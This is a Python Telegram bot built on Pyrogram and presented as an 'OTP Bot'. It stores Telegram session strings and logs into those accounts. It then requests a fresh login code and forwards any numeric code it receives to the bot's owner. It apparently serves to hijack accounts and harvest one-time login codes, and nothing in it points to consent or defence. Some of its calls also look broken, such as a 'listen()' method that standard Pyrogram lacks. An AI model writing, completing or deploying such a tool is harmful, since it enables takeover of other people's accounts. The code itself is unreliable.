import asyncio
import os
import json
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID

# Initialize Bot
bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Session Storage
SESSIONS_FILE = "sessions.json"
if not os.path.exists(SESSIONS_FILE):
    with open(SESSIONS_FILE, "w") as f:
        json.dump({}, f)

# Load Sessions
def load_sessions():
    with open(SESSIONS_FILE, "r") as f:
        return json.load(f)

# Save Sessions
def save_sessions(sessions):
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions, f)

# Command: /start
@bot.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply_text(
        "**Welcome to Pyrogram v2 OTP Bot!**\nUse `/add {session}` to add an account.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add Session", callback_data="add_session")],
            [InlineKeyboardButton("📂 View Sessions", callback_data="view_sessions")]
        ])
    )

# Command: /add {session}
@bot.on_message(filters.command("add") & filters.user(OWNER_ID))
async def add_session(client, message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return await message.reply_text("⚠️ **Usage:** `/add {pyrogram.session.v2}`")

    session_string = args[1]
    sessions = load_sessions()
    
    session_id = str(len(sessions) + 1)
    sessions[session_id] = {"session": session_string}
    save_sessions(sessions)
    
    await message.reply_text(f"✅ **Session Added!**\nSession ID: `{session_id}`")

# Command: /login {session_id}
@bot.on_message(filters.command("login") & filters.user(OWNER_ID))
async def login_session(client, message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return await message.reply_text("⚠️ **Usage:** `/login {session_id}`")

    session_id = args[1]
    sessions = load_sessions()

    if session_id not in sessions:
        return await message.reply_text("❌ **Invalid Session ID!**")

    session_string = sessions[session_id]["session"]
    
    # Login to session
    session_client = Client(f"session_{session_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
    
    try:
        await session_client.connect()
        user = await session_client.get_me()
        phone_number = user.phone_number
        await message.reply_text(f"📞 **Session `{session_id}` belongs to:** `{phone_number}`\n\n⚡ **Requesting OTP...**")

        async def wait_for_otp():
            async for otp in session_client.listen():
                if otp.text and otp.text.isdigit():
                    await bot.send_message(OWNER_ID, f"🔑 **OTP for `{phone_number}`:** `{otp.text}`")
                    break

        await asyncio.gather(session_client.send_code(phone_number), wait_for_otp())

    except Exception as e:
        await message.reply_text(f"❌ **Error:** `{str(e)}`")
    finally:
        await session_client.disconnect()

# Start Bot
print("🚀 Bot Started!")
bot.run()
